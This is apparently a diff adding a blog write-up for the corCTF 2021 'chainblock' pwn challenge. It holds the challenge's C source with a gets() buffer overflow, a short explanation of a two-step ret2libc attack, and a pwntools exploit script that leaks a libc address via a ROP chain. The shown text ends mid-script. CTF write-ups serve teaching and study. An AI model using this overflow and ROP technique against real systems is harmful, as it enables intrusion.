@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>chainblock</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/chainblock/#chainblock-c">chainblock.c</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>chainblock</h1>
+    </header>
+
+    <div class="content">
+        <pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I made a chain of blocks!
+</span><span>nc pwn.be.ax 5000
+</span></code></pre>
+<p>We're provided source, a binary, and ld/libc.</p>
+<h3 id="chainblock-c">chainblock.c</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">*</span><span> name </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Techlead&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">int</span><span> balance </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">100000000</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">verify</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">char</span><span> buf[</span><span style="color:#ffcc66;">255</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Please enter your name: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">gets</span><span>(buf)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">strcmp</span><span>(buf</span><span style="color:#ccc9c2cc;">,</span><span> name) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;KYC failed, wrong identity!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Hi </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> name)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Your balance is </span><span style="color:#ffcc66;">%d</span><span style="color:#bae67e;"> chainblocks!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> balance)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>() {
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">,</span><span> _IONBF</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;      ___           ___           ___                       ___     </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">          ___        /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\    \n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /:/  /        /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">        /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">      /::|  |   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/__/        /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\       \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">    /:|:|  |   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  /:/  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">   /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;"> ___   /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">~</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">      /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  /:/|:|  |__ </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; /:/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\ \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  __/:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/ /:/ |:| /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\  \\</span><span style="color:#bae67e;">/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  / </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  / /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  /    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__|:|/:/  /</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\            \\</span><span style="color:#bae67e;">::/  /       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">::/  /  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">::/__/         |:/:/  / </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">           /:/  /        /:/  /    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">         |::/  /  </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">         /:/  /        /:/  /      </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         /:/  /   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/                     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;      ___           ___       ___           ___           ___     </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">     /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\    \n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /:/  /    /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /::</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">       /:/  /    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/  /    /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">     /:/__/     </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">~</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">   /:/  /    /:/  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">   /:/  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">   /::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">____ </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\ \\</span><span style="color:#bae67e;">:|__| /:/__/    /:/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> /:/</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:::::</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot; </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">~</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  / </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\    \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;"> /:/  / </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\  \\</span><span style="color:#bae67e;">/__/ </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/_|:|~~|~   </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;  </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\ \\</span><span style="color:#bae67e;">::/  /   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\    \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  /:/  /   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">          |:|  |    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;   </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  /     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\    \\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/:/  /     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\  \\</span><span style="color:#bae67e;">         |:|  |    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">::/__/       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\    \\</span><span style="color:#bae67e;">::/  /       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">:</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">__</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">        |:|  |    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;     ~~            </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">/__/         </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">|__|    </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;----------------------------------------------------------------------------------&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to Chainblock, the world&#39;s most advanced chain of blocks.</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Chainblock is a unique company that combines cutting edge cloud</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;technologies with high tech AI powered machine learning models</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;to create a unique chain of blocks that learns by itself!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Chainblock is also a highly secure platform that is unhackable by design.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;We use advanced technologies like NX bits and anti-hacking machine learning models</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;to ensure that your money is safe and will always be safe!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;----------------------------------------------------------------------------------&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;For security reasons we require that you verify your identity.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">verify</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The vulnerability is in the function verify, in the gets invocation. There isn't any useful code for shell or flag reading inside the binary, but we can override the return pointer and it's linked to libc so ret2libc is an option. I did a two step exploit which leaked a pointer into libc and returned back into the vulnerable function, and then using the calculated libc address to return onto a one_gadget.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;chainblock&quot;</span><span>)
+</span><span>libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span>)
+</span><span>ld </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./ld-linux-x86-64.so.2&quot;</span><span>)
+</span><span>POP_RDI_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#ffcc66;">0x401493</span><span>)
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.be.ax&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5000</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([ld</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">env</span><span style="color:#f29e74;">=</span><span>{</span><span style="color:#bae67e;">&quot;LD_PRELOAD&quot;</span><span style="color:#ccc9c2cc;">: </span><span>libc</span><span style="color:#f29e74;">.</span><span>path})
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([ld</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">env</span><span style="color:#f29e74;">=</span><span>{</span><span style="color:#bae67e;">&quot;LD_PRELOAD&quot;</span><span style="color:#ccc9c2cc;">: </span><span>libc</span><span style="color:#f29e74;">.</span><span>path})
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>({
+</span><span>        </span><span style="color:#ffcc66;">264</span><span style="color:#ccc9c2cc;">: </span><span>POP_RDI_RET</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">272</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;__libc_start_main&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">280</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>plt[</span><span style="color:#bae67e;">&#39;puts&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#ffcc66;">288</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;verify&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
+</span><span>    })
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;identity!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    libc_start_address </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">from_bytes</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">byteorder</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;little&quot;</span><span>)
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span>libc_start_address </span><span style="color:#f29e74;">- </span><span>libc</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&quot;__libc_start_main&quot;</span><span>]
